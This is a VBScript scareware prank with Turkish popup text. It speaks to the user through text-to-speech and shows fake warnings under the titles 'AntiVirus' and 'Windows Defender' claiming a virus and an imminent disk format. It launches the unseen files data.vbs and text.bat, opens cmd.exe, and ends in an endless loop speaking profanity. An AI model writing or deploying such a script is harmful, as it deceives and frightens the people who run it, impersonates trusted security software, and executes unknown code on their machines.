Set speech = CreateObject("SAPI.SpVoice")
text = "I LOVE YOUR COMPUTER CAN I USE IT?"
speech.Speak text
x=msgbox("Hata Yaptin." ,0, "Executable Service Windows10 General InforMation SysTem.")
x=msgbox("Anormal Aktivite tespit edildi .. Temizleniyor ..." ,64, "AntiVirus")
result = MsgBox ("AntiVirusv3'den Memnun musunuz?", vbYesNo, "Windows Defender")
Select Case result
Case vbYes
    Dim oShell
Set oShell = WScript.CreateObject ("WScript.Shell")
oShell.run "data.vbs"
Set oShell = Nothing
Case vbNo
x=MsgBox("Demek Oyle...Program Silinsin mi?" ,4, "Program Sizin icin Guncellenecek..")
x=MsgBox("Islemi tamamlamak icin sana actigim yere 'SystemInfo' yazar misin?" ,4, "Program Sizin icin Guncellenecek..")
Set wshshell = wscript.CreateObject("WScript.Shell")
Wshshell.run "cmd.exe"
wscript.sleep 18500
x=MsgBox("Tesekkurler. Kapatabilirsin" ,4, "Umarim Yeniden karsilasiriz..")
End Select
wscript.sleep 1900
WScript.CreateObject("WScript.Shell").Popup "System32>C:// yabanci dosya bulundu taraniyor..", 64, "AnTVirus", 4096
x=msgbox("VIRUS BULUNDU TYPE:Scareware" ,2, "VIRUS")
MsgBox "Sistemde Kritik acik Bulundu..." , 0 + 48 , "Error!"
MsgBox "Sistem 5 Saniye icinde formatlanacak. Lutfen Panik yapmayin" , 0 + 48 , "Error!"
Set wshshell = wscript.CreateObject("WScript.Shell")
Wshshell.run "text.bat"
Dim text, speech
Set speech = CreateObject("SAPI.SpVoice")
do
text = "fuck you damn 123432432 9876543210"
speech.Speak text
loop

